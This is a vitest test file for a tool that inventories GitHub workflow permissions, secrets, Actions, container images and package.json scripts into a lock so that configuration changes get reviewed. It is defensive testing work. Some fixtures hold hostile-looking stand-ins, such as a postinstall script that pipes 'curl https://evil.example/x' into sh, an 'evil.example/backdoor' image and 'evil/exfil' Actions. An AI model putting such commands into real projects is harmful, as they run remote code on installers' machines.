// Project configuration in the lock: GitHub workflows, composite Actions, and package.json
// scripts. AI agents edit these as readily as code, and a new `permissions: write-all`, secret,
// or postinstall hook is a bigger change than most functions, so each is recorded and reviewed.

import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { checkFiles } from "../src/check.js";
import { buildLock } from "../src/lock.js";
import { projectFiles } from "../src/project-files.js";

const PIN = "3d3c42e5aac5ba805825da76410c181273ba90b1";
const DIGEST = `sha256:${"a".repeat(64)}`;
/** What `ci.unverifiable` and `npm.unverifiable` look like: the file's SHA-256, so any edit changes them. */
const UNVERIFIABLE = /^(ci|npm)\.unverifiable\(sha256:[0-9a-f]{64}\)$/;
let dir: string;

// A throwaway repository per test, from file names and contents.
const repos: string[] = [];
afterAll(() => {
  for (const r of repos) rmSync(r, { recursive: true, force: true });
});
function repo(files: Record<string, string>): string {
  const root = mkdtempSync(path.join(tmpdir(), "permlang-config-"));
  repos.push(root);
  for (const [name, text] of Object.entries(files)) {
    mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
    writeFileSync(path.join(root, name), text);
  }
  return root;
}
/** Each recorded file, by its path in the repository, with what it grants. */
function inventory(root: string): Record<string, string[]> {
  return Object.fromEntries(projectFiles(root).map((e) => [path.relative(root, e.file).replaceAll("\\", "/"), e.actual]));
}
const workflow = (...lines: string[]) => repo({ ".github/workflows/w.yml": lines.join("\n") });
const grants = (root: string, file = ".github/workflows/w.yml") => inventory(root)[file];

beforeAll(() => {
  dir = mkdtempSync(path.join(tmpdir(), "permlang-project-"));
  mkdirSync(path.join(dir, ".github", "workflows"), { recursive: true });
  writeFileSync(
    path.join(dir, ".github", "workflows", "release.yml"),
    [
      "name: Release",
      "on:",
      "  release:",
      "    types: [published]",
      "  pull_request_target:",
      "permissions:",
      "  contents: read",
      "jobs:",
      "  publish:",
      "    runs-on: ubuntu-latest",
      "    permissions:",
      "      contents: write",
      "      id-token: write",
      "    steps:",
      `      - uses: actions/checkout@${PIN} # v7.0.1`,
      "      - uses: actions/setup-node@v7",
      "      - run: npm publish",
      "        env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "  notify:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - uses: ./.github/actions/notify",
      "        with:",
      "          webhook: ${{ secrets['SLACK_WEBHOOK'] }}",
      "  reuse:",
      "    uses: org/shared/.github/workflows/deploy.yml@main",
      "    secrets: inherit",
    ].join("\n"),
  );
  writeFileSync(path.join(dir, ".github", "workflows", "lint.yaml"), "on: [push, pull_request]\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n");
  writeFileSync(path.join(dir, ".github", "workflows", "broken.yml"), "on: [push\njobs: {\n");
  writeFileSync(
    path.join(dir, "action.yml"),
    ["name: Thing", "runs:", "  using: composite", "  steps:", "    - uses: actions/cache/restore@v6", "      with:", "        key: x"].join("\n"),
  );
  writeFileSync(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "app", scripts: { test: "vitest run", postinstall: "node scripts/setup.js" }, dependencies: {} }, null, 2),
  );
}, 30_000);

afterAll(() => rmSync(dir, { recursive: true, force: true }));

const entry = (name: string) => projectFiles(dir).find((f) => f.name === name)!;

describe("project configuration", () => {
  it("records a workflow's triggers, permissions per job, secrets, and Actions", () => {
    expect(entry("<release.yml>").actual).toEqual([
      "ci.action(./.github/actions/notify)",
      "ci.action(actions/checkout)",
      "ci.action(actions/setup-node)",
      "ci.action(org/shared/.github/workflows/deploy.yml)",
      "ci.permission(contents: read)",
      "ci.permission(contents: write)",
      "ci.permission(id-token: write)",
      "ci.secret(NPM_TOKEN)",
      "ci.secret(SLACK_WEBHOOK)",
      "ci.secret(inherit)",
      "ci.trigger(pull_request_target)",
      "ci.trigger(release)",
      // This repository has no .github/actions/notify, so what that step runs comes from elsewhere.
      "ci.unpinned(./.github/actions/notify)",
      "ci.unpinned(actions/setup-node)",
      "ci.unpinned(org/shared/.github/workflows/deploy.yml)",
    ]);
  });

  it("uses the workflow's permissions for jobs that don't set their own, and 'default' when neither does", () => {
    // `notify` and `reuse` inherit contents: read from the workflow; `publish` sets its own.
    expect(entry("<release.yml>").actual).not.toContain("ci.permission(default)");
    // Without a permissions block anywhere, the token gets the repository's default, which can be write-all.
    expect(entry("<lint.yaml>").actual).toEqual(["ci.permission(default)", "ci.trigger(pull_request)", "ci.trigger(push)"]);
  });

  it("points each capability at the line that grants it", () => {
    const release = entry("<release.yml>");
    expect(release.sites["ci.permission(contents: write)"]!.line).toBe(12);
    expect(release.sites["ci.secret(NPM_TOKEN)"]!.line).toBe(19);
    expect(release.sites["ci.unpinned(actions/setup-node)"]!.line).toBe(16);
    expect(release.sites["ci.trigger(pull_request_target)"]!.line).toBe(5);
    expect(release.via["ci.unpinned(actions/setup-node)"]).toEqual(["uses: actions/setup-node@v7"]);
  });

  it("records a composite Action's steps", () => {
    expect(entry("<action.yml>").actual).toEqual(["ci.action(actions/cache/restore)", "ci.unpinned(actions/cache/restore)"]);
  });

  it("records package.json scripts with their commands, at their lines", () => {
    const pkg = entry("<package.json>");
    expect(pkg.actual).toEqual(["npm.script(postinstall: node scripts/setup.js)", "npm.script(test: vitest run)"]);
    expect(pkg.sites["npm.script(postinstall: node scripts/setup.js)"]!.line).toBe(5);
  });

  it("can't read a broken workflow, and says so instead of passing it", () => {
    expect(entry("<broken.yml>").actual).toEqual([expect.stringMatching(UNVERIFIABLE)]);
  });

  it("marks every entry as configuration, keyed by file", () => {
    const files = projectFiles(dir);
    expect(files.every((f) => f.kind === "config" && f.line === 1 && !f.annotated)).toBe(true);
    expect(files.map((f) => path.relative(dir, f.file).replaceAll("\\", "/")).sort()).toEqual([
      ".github/workflows/broken.yml",
      ".github/workflows/lint.yaml",
      ".github/workflows/release.yml",
      "action.yml",
      "package.json",
    ]);
  });

  it("finds nothing in a folder without configuration", () => {
    expect(projectFiles(path.join(dir, ".github"))).toEqual([]);
  });
});

describe("project configuration: Actions in the repository, and Docker images", () => {
  let repo: string;
  beforeAll(() => {
    repo = mkdtempSync(path.join(tmpdir(), "permlang-project-actions-"));
    mkdirSync(path.join(repo, ".github", "actions", "deploy"), { recursive: true });
    writeFileSync(
      path.join(repo, ".github", "actions", "deploy", "action.yml"),
      [
        "name: Deploy",
        "runs:",
        "  using: composite",
        "  steps:",
        "    - uses: docker://alpine:3.20",
        `    - uses: docker://node@sha256:${"a".repeat(64)}`,
        "    - uses: acme/no-ref",
      ].join("\n"),
    );
    writeFileSync(path.join(repo, "package.json"), "{ not json");
  });
  afterAll(() => rmSync(repo, { recursive: true, force: true }));

  it("records composite Actions under .github/actions; an image is pinned only by its digest", () => {
    const action = projectFiles(repo).find((f) => f.name === "<action.yml>")!;
    expect(path.relative(repo, action.file)).toBe(path.join(".github", "actions", "deploy", "action.yml"));
    expect(action.actual).toEqual([
      "ci.action(acme/no-ref)",
      "ci.action(docker://alpine)",
      "ci.action(docker://node)",
      "ci.unpinned(acme/no-ref)",
      "ci.unpinned(docker://alpine)",
    ]);
  });

  it("can't read a package.json that isn't JSON, and says so instead of passing it", () => {
    expect(projectFiles(repo).find((f) => f.name === "<package.json>")!.actual).toEqual([expect.stringMatching(UNVERIFIABLE)]);
  });
});

// --- YAML anchors, and how GitHub reads keys and values ----------------------------

describe("workflows written with YAML anchors and aliases", () => {
  it("reads triggers, permissions, Actions, and secrets: inherit through aliases", () => {
    const root = workflow(
      "env:",
      "  T: &trig pull_request_target",
      "  U: &act evil/exfil@main",
      "  P: &perm write-all",
      "  I: &inh inherit",
      "on: *trig",
      "permissions: *perm",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - uses: *act",
      "  call:",
      "    uses: ./.github/workflows/r.yml",
      "    secrets: *inh",
    );
    expect(grants(root)).toEqual([
      "ci.action(./.github/workflows/r.yml)",
      "ci.action(evil/exfil)",
      "ci.permission(write-all)",
      "ci.secret(inherit)",
      "ci.trigger(pull_request_target)",
      "ci.unpinned(evil/exfil)",
    ]);
  });

  it("reads a permissions block, or one level in it, from an alias, at the line that uses it", () => {
    const root = workflow(
      "on: push",
      "env:",
      "  LEVEL: &lvl write",
      "permissions:",
      "  contents: read",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      `      - uses: actions/checkout@${PIN}`,
      "        with: &w",
      "          contents: write",
      "          id-token: write",
      "  b:",
      "    runs-on: ubuntu-latest",
      "    permissions: *w",
      "    steps: [{ run: echo }]",
      "  c:",
      "    runs-on: ubuntu-latest",
      "    permissions:",
      "      issues: *lvl",
      "    steps: [{ run: echo }]",
    );
    expect(grants(root)).toEqual([
      "ci.action(actions/checkout)",
      "ci.permission(contents: read)",
      "ci.permission(contents: write)",
      "ci.permission(id-token: write)",
      "ci.permission(issues: write)",
      "ci.trigger(push)",
    ]);
    const sites = projectFiles(root)[0]!.sites;
    expect(sites["ci.permission(id-token: write)"]!.line).toBe(16);
  });

  it("reads keys written as aliases", () => {
    const root = workflow(
      "x: &k permissions",
      "on: push",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    *k : write-all",
      "    steps: [{ run: echo }]",
    );
    expect(grants(root)).toEqual(["ci.permission(write-all)", "ci.trigger(push)"]);
  });

  it("reads steps and Actions anchored anywhere, such as in a matrix", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    strategy:",
      "      matrix:",
      "        include:",
      "          - &step { uses: evil/hidden@main }",
      "    steps:",
      "      - *step",
      "  b:",
      "    runs-on: ubuntu-latest",
      "    steps: &steps",
      `      - uses: actions/checkout@${PIN}`,
      "  c:",
      "    runs-on: ubuntu-latest",
      "    steps: *steps",
    );
    expect(grants(root)).toEqual(["ci.action(actions/checkout)", "ci.action(evil/hidden)", "ci.trigger(push)", "ci.unpinned(evil/hidden)"]);
  });

  it("expands merge keys, which GitHub rejects today, so nothing they bring in is missed if it ever accepts them", () => {
    const root = workflow(
      "on: push",
      "jobs:",
      "  a: &base",
      "    runs-on: ubuntu-latest",
      "    permissions: { contents: read }",
      "    steps:",
      `      - uses: actions/checkout@${PIN}`,
      "  b:",
      "    <<: *base",
      "    permissions: { issues: write }",
      "  c:",
      "    <<: [*base]",
      "    steps:",
      "      - <<: { uses: evil/merged@main }",
    );
    expect(grants(root)).toEqual([
      "ci.action(actions/checkout)",
      "ci.action(evil/merged)",
      "ci.permission(contents: read)",
      "ci.permission(issues: write)",
      "ci.trigger(push)",
      "ci.unpinned(evil/merged)",
    ]);
  });

  it("can't follow an alias with no anchor before it, or one inside its own anchor, and says so", () => {
    const missing = workflow("on: push", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    permissions: *nope", "    steps:", "      - uses: evil/x@main");
    expect(grants(missing)).toEqual(["ci.action(evil/x)", "ci.trigger(push)", "ci.unpinned(evil/x)", expect.stringMatching(UNVERIFIABLE)]);
    const circular = workflow("on: push", "permissions: {}", "jobs: &j", "  a:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: *j");
    expect(grants(circular)).toEqual(["ci.trigger(push)", expect.stringMatching(UNVERIFIABLE)]);
  });

  it("reads `on` as GitHub does, whatever a %YAML 1.1 directive says", () => {
    const root = workflow("%YAML 1.1", "---", "on: pull_request_target", "permissions: write-all", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    steps: [{ run: echo }]");
    expect(grants(root)).toEqual(["ci.permission(write-all)", "ci.trigger(pull_request_target)"]);
  });

  it("reads `${{ 'text' }}` as the text, as GitHub does for any key or value", () => {
    const root = workflow(
      "on: ${{ 'pull_request_target' }}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    ${{ 'permissions' }}: ${{ 'write-all' }}",
      "    steps:",
      "      - uses: ${{ 'evil/x@main' }}",
      "  b:",
      "    uses: org/shared/.github/workflows/w.yml@" + PIN,
      "    secrets: ${{ 'inherit' }}",
    );
    expect(grants(root)).toEqual([
      "ci.action(evil/x)",
      "ci.action(org/shared/.github/workflows/w.yml)",
      "ci.permission(default)",
      "ci.permission(write-all)",
      "ci.secret(inherit)",
      "ci.trigger(pull_request_target)",
      "ci.unpinned(evil/x)",
    ]);
  });
});

// --- Secrets ------------------------------------------------------------------------

describe("secrets, however an expression writes them", () => {
  it("records a literal name in any case or spacing, and every secret for anything else", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: echo "$A $B $C $D $E $F $G $H"',
      "        env:",
      "          A: ${{ SECRETS.NPM_TOKEN }}",
      "          B: ${{ secrets[format('{0}_KEY', 'AWS')] }}",
      "          C: ${{ secrets[matrix.name] }}",
      "          D: ${{ join(secrets.*, ',') }}",
      "          E: ${{ toJson(secrets) }}",
      "          F: ${{ secrets . DEPLOY_KEY }}",
      "          G: ${{ secrets [ 'SIGNING_KEY' ] }}",
      '          H: ${{ secrets [ "quoted_key" ] }}',
    );
    expect(grants(root)).toEqual([
      "ci.secret(DEPLOY_KEY)",
      "ci.secret(NPM_TOKEN)",
      "ci.secret(QUOTED_KEY)",
      "ci.secret(SIGNING_KEY)",
      "ci.secret(all)",
      "ci.trigger(push)",
    ]);
  });

  it("names a secret in upper case, as GitHub stores it", () => {
    expect(grants(workflow("on: push", "permissions: {}", "env:", "  T: ${{ Secrets.npm_Token }} and ${{ secrets['Other'] }}"))).toEqual([
      "ci.secret(NPM_TOKEN)",
      "ci.secret(OTHER)",
      "ci.trigger(push)",
    ]);
  });

  it("records each use of the whole secrets context as every secret", () => {
    for (const expression of ["secrets", "toJSON(secrets)", "fromJSON(toJSON(secrets)).X", "secrets.*", "secrets[0]", "(secrets).X", "contains(secrets, 'x')"]) {
      expect(grants(workflow("on: push", "permissions: {}", "env:", `  T: \${{ ${expression} }}`)), expression).toEqual(["ci.secret(all)", "ci.trigger(push)"]);
    }
  });

  it("reads conditions, which are expressions without ${{ }}, and expressions in keys", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "jobs:",
      "  a:",
      "    if: secrets.JOB_GATE != ''",
      "    runs-on: ubuntu-latest",
      "    env:",
      "      ${{ secrets.AS_A_NAME }}: x",
      "    steps:",
      "      - if: SECRETS.step_gate",
      "        run: echo",
      "      - if: ${{ 'secrets.LITERAL_CONDITION' }}",
      "        run: echo",
    );
    expect(grants(root)).toEqual(["ci.secret(AS_A_NAME)", "ci.secret(JOB_GATE)", "ci.secret(LITERAL_CONDITION)", "ci.secret(STEP_GATE)", "ci.trigger(push)"]);
  });

  it("ignores secrets mentioned outside an expression, in a string, or as another object's property", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "env:",
      "  if: secrets.NOT_A_CONDITION",
      "  A: ${{ 'secrets.IN_A_STRING' }}",
      "  B: ${{ github.secrets.X }}",
      "  C: ${{ format('{0} secrets.Y', github.ref) }}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - name: see docs/secrets.md",
      '        run: echo "configure secrets.NPM_TOKEN in settings"',
      "      - uses: actions/github-script@" + PIN,
      "        with:",
      "          uses: not-an-action@main",
    );
    expect(grants(root)).toEqual(["ci.action(actions/github-script)", "ci.trigger(push)"]);
  });
});

// --- Permissions --------------------------------------------------------------------

describe("empty permissions", () => {
  it("records `permissions: {}` as no permissions, and `permissions:` with no value as the default", () => {
    const none = workflow("on: push", "permissions: {}", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    steps: [{ run: echo }]");
    expect(grants(none)).toEqual(["ci.trigger(push)"]);
    const empty = workflow("on: push", "jobs:", "  a:", "    runs-on: ubuntu-latest", "    permissions:", "    steps: [{ run: echo }]");
    expect(grants(empty)).toEqual(["ci.permission(default)", "ci.trigger(push)"]);
  });
});

// --- Workflow and Action files --------------------------------------------------------

describe("which files are read", () => {
  it("reads workflows and Actions whose names are in any case", () => {
    const root = repo({
      ".github/workflows/Deploy.YML": "on: push\npermissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: echo }]\n",
      ".github/actions/build/ACTION.YAML": "runs:\n  using: composite\n  steps:\n    - uses: evil/x@main\n",
    });
    expect(inventory(root)).toEqual({
      ".github/workflows/Deploy.YML": ["ci.permission(write-all)", "ci.trigger(push)"],
      ".github/actions/build/ACTION.YAML": ["ci.action(evil/x)", "ci.unpinned(evil/x)"],
    });
  });

  it("records a link in .github/workflows that leads nowhere as unverifiable, instead of crashing", (ctx) => {
    const root = repo({ ".github/workflows/ok.yml": "on: push\npermissions: {}\njobs: {}\n" });
    try {
      symlinkSync("missing-target.yml", path.join(root, ".github", "workflows", "broken.yml"));
    } catch {
      ctx.skip(); // creating links needs a permission Windows doesn't always give
    }
    expect(inventory(root)).toEqual({
      ".github/workflows/broken.yml": [expect.stringMatching(UNVERIFIABLE)],
      ".github/workflows/ok.yml": ["ci.trigger(push)"],
    });
  });

  it("strips a byte-order mark, as npm and GitHub do", () => {
    const root = repo({
      "package.json": `\uFEFF${JSON.stringify({ name: "x", scripts: { postinstall: "node evil.js" } })}`,
      ".github/workflows/w.yml": "\uFEFFon: push\npermissions: write-all\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps: [{ run: echo }]\n",
    });
    expect(inventory(root)).toEqual({
      ".github/workflows/w.yml": ["ci.permission(write-all)", "ci.trigger(push)"],
      "package.json": ["npm.script(postinstall: node evil.js)"],
    });
  });

  it("changes an unverifiable entry whenever the file changes, but not for its line endings", () => {
    const unverifiable = (text: string) => grants(repo({ ".github/workflows/w.yml": text }))![0];
    const before = unverifiable("on: [push\njobs: {\n");
    expect(unverifiable("on: [push\njobs: {\n")).toBe(before);
    expect(unverifiable("on: [push\r\njobs: {\r\n")).toBe(before);
    expect(unverifiable("on: [pull_request_target\njobs: {\n")).not.toBe(before);
    const pkg = (text: string) => inventory(repo({ "package.json": text }))["package.json"]![0];
    expect(pkg("{ not json")).toMatch(UNVERIFIABLE);
    expect(pkg("{ not json")).not.toBe(pkg("{ still not json"));
  });
});

// --- Actions in the repository, Docker images, and job containers ----------------------

describe("local Actions and container images", () => {
  it("follows `uses: ./path` to that folder's action.yml, wherever it is", () => {
    const root = repo({
      ".github/workflows/w.yml": "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./ci/deploy\n",
      "ci/deploy/action.yml": "name: deploy\nruns:\n  using: composite\n  steps:\n    - uses: ./ci/inner\n    - uses: evil/exfil@main\n",
      "ci/inner/action.yaml": "runs:\n  using: composite\n  steps:\n    - uses: evil/deeper@v1\n",
      ".github/workflows/z.yml": "on: push\npermissions: {}\njobs: {}\n",
    });
    expect(inventory(root)).toEqual({
      ".github/workflows/w.yml": ["ci.action(./ci/deploy)", "ci.trigger(push)"],
      ".github/workflows/z.yml": ["ci.trigger(push)"],
      "ci/deploy/action.yml": ["ci.action(./ci/inner)", "ci.action(evil/exfil)", "ci.unpinned(evil/exfil)"],
      "ci/inner/action.yaml": ["ci.action(evil/deeper)", "ci.unpinned(evil/deeper)"],
    });
    // In the order of their paths, not the order they were reached in.
    expect(Object.keys(inventory(root))).toEqual([".github/workflows/w.yml", ".github/workflows/z.yml", "ci/deploy/action.yml", "ci/inner/action.yaml"]);
  });

  it("records a local Action that isn't in the repository as unpinned: it comes from somewhere at run time", () => {
    const root = repo({
      ".github/workflows/w.yml": "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./checked-out/action\n      - uses: ./../outside\n      - uses: ./docker-only\n",
      "docker-only/Dockerfile": "FROM alpine\n",
    });
    expect(grants(root)).toEqual([
      "ci.action(./../outside)",
      "ci.action(./checked-out/action)",
      "ci.action(./docker-only)",
      "ci.trigger(push)",
      "ci.unpinned(./../outside)",
      "ci.unpinned(./checked-out/action)",
    ]);
  });

  it("records a Docker Action's image, and each job's container and service images, pinned only by digest", () => {
    const root = repo({
      ".github/workflows/w.yml": [
        "on: push",
        "permissions: {}",
        "jobs:",
        "  a:",
        "    runs-on: ubuntu-latest",
        "    container: evil/image:latest",
        "    services:",
        "      db:",
        "        image: evil/db:latest",
        "      cache: redis:7",
        `      pinned: { image: "postgres@${DIGEST}" }`,
        "    steps: [{ run: echo }]",
        "  b:",
        "    runs-on: ubuntu-latest",
        "    container:",
        "      image: ghcr.io/acme/build:1.0",
        "    steps: [{ run: echo }]",
      ].join("\n"),
      ".github/actions/build/action.yml": "runs:\n  using: docker\n  image: docker://evil.example/backdoor:latest\n",
      "action.yml": "runs:\n  using: docker\n  image: Dockerfile\n",
    });
    expect(inventory(root)).toEqual({
      ".github/workflows/w.yml": [
        "ci.action(docker://evil/db)",
        "ci.action(docker://evil/image)",
        "ci.action(docker://ghcr.io/acme/build)",
        "ci.action(docker://postgres)",
        "ci.action(docker://redis)",
        "ci.trigger(push)",
        "ci.unpinned(docker://evil/db)",
        "ci.unpinned(docker://evil/image)",
        "ci.unpinned(docker://ghcr.io/acme/build)",
        "ci.unpinned(docker://redis)",
      ],
      ".github/actions/build/action.yml": ["ci.action(docker://evil.example/backdoor)", "ci.unpinned(docker://evil.example/backdoor)"],
    });
  });

  it("keeps the registry, port, and path of an image, so different images never share a name", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      `      - uses: docker://ghcr.io:443/good/img@${DIGEST}`,
      `      - uses: docker://ghcr.io:443/evil/img@${DIGEST}`,
      "      - uses: docker://localhost:5000/tools/lint:1.2",
      "      - uses: docker://alpine:3.20",
    );
    expect(grants(root)).toEqual([
      "ci.action(docker://alpine)",
      "ci.action(docker://ghcr.io:443/evil/img)",
      "ci.action(docker://ghcr.io:443/good/img)",
      "ci.action(docker://localhost:5000/tools/lint)",
      "ci.trigger(push)",
      "ci.unpinned(docker://alpine)",
      "ci.unpinned(docker://localhost:5000/tools/lint)",
    ]);
  });

  it("can't tell which image an expression names, and says so", () => {
    const root = workflow(
      "on: push",
      "permissions: {}",
      "jobs:",
      "  a:",
      "    runs-on: ubuntu-latest",
      "    strategy: { matrix: { image: [evil/x] } }",
      "    container: ${{ matrix.image }}",
      "    services:",
      "      db: node:${{ matrix.version }}",
      "    steps: [{ run: echo }]",
    );
    expect(grants(root)).toEqual(["ci.action(docker://node)", "ci.trigger(push)", "ci.unpinned(docker://node)", expect.stringMatching(UNVERIFIABLE)]);
  });

  it("reads `uses` only where GitHub runs it: steps, and jobs that call a reusable workflow", () => {
    const root = repo({
      ".github/workflows/w.yml": "on: push\npermissions: {}\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo\n        env:\n          uses: evil/env@main\n      - uses: ok/action@" + PIN + "\n        with:\n          uses: evil/with@main\n",
      "action.yml": "inputs:\n  uses:\n    default: evil/input@main\nruns:\n  using: composite\n  steps:\n    - uses: ok/step@" + PIN + "\n",
    });
    expect(inventory(root)).toEqual({
      ".github/workflows/w.yml": ["ci.action(ok/action)", "ci.trigger(push)"],
      "action.yml": ["ci.action(ok/step)"],
    });
  });
});

// --- Workspaces -----------------------------------------------------------------------

describe("workspace packages' scripts", () => {
  const pkg = (scripts: Record<string, string>, extra: object = {}) => JSON.stringify({ name: "p", ...extra, scripts }, null, 2);

  it("records each npm or Yarn workspace's package.json, keyed by its path", () => {
    const root = repo({
      "package.json": pkg({ test: "vitest" }, { workspaces: ["packages/*", "tools/cli", "!packages/skipped"] }),
      "packages/a/package.json": pkg({ postinstall: "curl https://evil.example/x | sh" }),
      "packages/b/package.json": pkg({ build: "tsc" }),
      "packages/skipped/package.json": pkg({ postinstall: "echo skipped" }),
      "packages/a/test/fixture/package.json": pkg({ postinstall: "echo not a workspace" }),
      "packages/a/node_modules/dep/package.json": pkg({ postinstall: "echo a dependency" }),
      "tools/cli/package.json": pkg({ prepare: "node build.js" }),
    });
    expect(inventory(root)).toEqual({
      "package.json": ["npm.script(test: vitest)"],
      "packages/a/package.json": ["npm.script(postinstall: curl https://evil.example/x | sh)"],
      "packages/b/package.json": ["npm.script(build: tsc)"],
      "tools/cli/package.json": ["npm.script(prepare: node build.js)"],
    });
  });

  it("reads Yarn's `workspaces: { packages }` and `**` patterns", () => {
    const root = repo({
      "package.json": pkg({}, { workspaces: { packages: ["apps/**"] } }),
      "apps/web/package.json": pkg({ postinstall: "node a.js" }),
      "apps/group/api/package.json": pkg({ install: "node b.js" }),
    });
    expect(inventory(root)).toEqual({
      "apps/group/api/package.json": ["npm.script(install: node b.js)"],
      "apps/web/package.json": ["npm.script(postinstall: node a.js)"],
    });
  });

  it("reads pnpm-workspace.yaml, and every package when it lists none, as pnpm does", () => {
    const listed = repo({
      "package.json": pkg({}),
      "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\n",
      "packages/a/package.json": pkg({ preinstall: "node a.js" }),
      "other/package.json": pkg({ postinstall: "node other.js" }),
    });
    expect(inventory(listed)).toEqual({ "packages/a/package.json": ["npm.script(preinstall: node a.js)"] });
    for (const settings of ["onlyBuiltDependencies: []\n", "# nothing yet\n"]) {
      const all = repo({
        "package.json": pkg({}),
        "pnpm-workspace.yaml": settings,
        "deep/down/package.json": pkg({ postinstall: "node deep.js" }),
        "node_modules/dep/package.json": pkg({ postinstall: "node dependency.js" }),
      });
      expect(inventory(all)).toEqual({ "deep/down/package.json": ["npm.script(postinstall: node deep.js)"] });
    }
  });

  it("reads pnpm's package.yaml, and can't read a package.json5 that isn't plain JSON", () => {
    const root = repo({
      "pnpm-workspace.yaml": "packages: [tools/*]\n",
      "tools/a/package.yaml": "name: a\nscripts:\n  postinstall: node a.js\n",
      "tools/b/package.json5": "{ name: 'b', scripts: { postinstall: 'node b.js' } }",
    });
    expect(inventory(root)).toEqual({
      "tools/a/package.yaml": ["npm.script(postinstall: node a.js)"],
      "tools/b/package.json5": [expect.stringMatching(UNVERIFIABLE)],
    });
  });

  it("can't read a workspace list it doesn't understand, and says so", () => {
    expect(inventory(repo({ "pnpm-workspace.yaml": "packages: [unclosed\n" }))).toEqual({ "pnpm-workspace.yaml": [expect.stringMatching(UNVERIFIABLE)] });
    expect(inventory(repo({ "package.json": pkg({}, { workspaces: "packages/*" }) }))).toEqual({ "package.json": [expect.stringMatching(UNVERIFIABLE)] });
  });
});

describe("project configuration in the check", () => {
  const code = () => {
    const file = path.join(dir, "app.ts");
    writeFileSync(file, "export const x = 1;\n");
    return [file];
  };
  const lockFile = () => path.join(dir, "permlang.lock.json");
  const recorded = () => buildLock(checkFiles(code(), { projectRoot: dir }), dir);

  it("records configuration in the lock, keyed by file", () => {
    expect(Object.keys(recorded().functions)).toEqual([
      ".github/workflows/broken.yml#<broken.yml>",
      ".github/workflows/lint.yaml#<lint.yaml>",
      ".github/workflows/release.yml#<release.yml>",
      "action.yml#<action.yml>",
      "package.json#<package.json>",
    ]);
  });

  it("fails on a new secret the lock doesn't record, at its line", () => {
    const lock = recorded();
    lock.functions[".github/workflows/release.yml#<release.yml>"] = lock.functions[".github/workflows/release.yml#<release.yml>"]!.filter((c) => c !== "ci.secret(NPM_TOKEN)");
    const report = checkFiles(code(), { projectRoot: dir, lock: { file: lockFile(), contents: lock } });
    const drift = report.diagnostics.filter((d) => d.code === "PERM005");
    expect(drift).toEqual([
      expect.objectContaining({
        severity: "error",
        line: 19,
        capability: "ci.secret(NPM_TOKEN)",
        message: ".github/workflows/release.yml now grants ci.secret(NPM_TOKEN), which permlang.lock.json doesn't record.",
      }),
    ]);
  });

  it("only warns when the lock predates configuration, so upgrading doesn't fail the build", () => {
    const old = { permlang: 1 as const, functions: {}, unsafe: {} };
    const report = checkFiles(code(), { projectRoot: dir, lock: { file: lockFile(), contents: old } });
    const drift = report.diagnostics.filter((d) => d.code === "PERM005");
    expect(drift.length).toBeGreaterThan(5);
    expect(drift.every((d) => d.severity === "warning" && d.message.includes("doesn't record project configuration yet"))).toBe(true);
  });

  it("says a file no longer grants what the lock records", () => {
    const lock = recorded();
    lock.functions["action.yml#<action.yml>"]!.push("ci.secret(OLD_TOKEN)");
    const report = checkFiles(code(), { projectRoot: dir, lock: { file: lockFile(), contents: lock } });
    expect(report.diagnostics.filter((d) => d.code === "PERM005").map((d) => `${d.severity} ${d.message}`)).toEqual([
      "warning action.yml no longer grants ci.secret(OLD_TOKEN), but permlang.lock.json still records it.",
    ]);
  });

  it("isn't recorded without a project root (the library default)", () => {
    expect(checkFiles(code()).functions.some((f) => f.kind === "config")).toBe(false);
  });
});
